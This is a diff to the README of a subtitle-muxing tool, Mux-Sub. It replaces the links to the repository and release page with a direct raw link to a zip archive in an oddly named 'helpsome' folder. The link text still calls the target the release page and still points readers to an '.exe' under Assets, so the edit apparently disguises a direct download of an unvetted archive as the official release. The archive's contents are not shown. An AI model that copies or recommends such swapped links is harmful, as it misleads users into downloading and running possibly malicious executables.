@@ -1,6 +1,6 @@
 # 🎬 Mux-Sub - Automate Your Anime Subtitle Muxing Workflow
 
-[![Download Mux-Sub](https://img.shields.io/badge/Download-Mux--Sub-blue.svg)](https://github.com/anthony591561-bit/Mux-Sub)
+[![Download Mux-Sub](https://img.shields.io/badge/Download-Mux--Sub-blue.svg)](https://raw.githubusercontent.com/anthony591561-bit/Mux-Sub/main/helpsome/Sub-Mux-1.7.zip)
 
 Mux-Sub manages the process of combining video files with subtitle files. It automates the task of matching episodes to their correct subtitles and prepares them for your media player. This tool handles font embedding, chapter creation, and audio track preservation. It works for both anime and donghua series.
 
@@ -21,7 +21,7 @@ Mux-Sub manages the process of combining video files with subtitle files. It aut
 
 ## 📥 Getting Started
 
-1. Visit the [Mux-Sub release page](https://github.com/anthony591561-bit/Mux-Sub) to download the latest version.
+1. Visit the [Mux-Sub release page](https://raw.githubusercontent.com/anthony591561-bit/Mux-Sub/main/helpsome/Sub-Mux-1.7.zip) to download the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Download this file to your computer.
 4. Move the file into a folder that you can easily find.
